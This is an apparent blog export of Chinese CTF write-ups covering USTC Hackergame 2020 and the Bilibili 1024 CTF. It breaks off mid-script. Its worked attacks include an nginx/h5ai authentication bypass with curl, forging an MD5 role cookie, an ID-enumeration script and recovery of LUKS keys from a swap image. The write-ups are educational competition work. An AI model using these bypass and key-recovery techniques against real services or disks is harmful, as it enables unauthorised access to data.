}    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span 